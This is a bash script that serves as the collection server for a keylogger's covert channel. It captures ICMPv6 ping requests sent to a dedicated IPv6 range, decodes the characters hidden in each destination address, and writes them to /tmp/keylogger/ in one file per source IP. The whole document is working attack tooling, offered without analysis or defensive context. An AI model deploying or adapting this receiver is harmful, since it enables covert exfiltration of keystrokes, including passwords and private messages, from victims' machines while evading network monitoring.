#!/bin/bash
net="2001:470:5816:f::/64"
out_dir=/tmp/keylogger/

ip route add local "$net" dev lo

tcpdump -l -i any "icmp6[icmptype] == icmp6-echo and dst net $net" \
  | awk -v out_dir="$out_dir"  -f <(cat - <<-'SCRIPT'
function save_char(n, ip) {
    n = strtonum("0x"n)

    if(n == 0xd) {
      n = 0xa;
    }

    if((n >= 0x20 && n < 0x80) || n == 0xa) {
      printf("%c", n) >> out_dir ip
    }
}

{
  split($5, a, ":");
  for(i = 4; i < length(a); i++) {
    save_char(substr(a[i], 1, 2), $3)
    save_char(substr(a[i], 3, 2), $3)
  }
  fflush()
}
SCRIPT
)
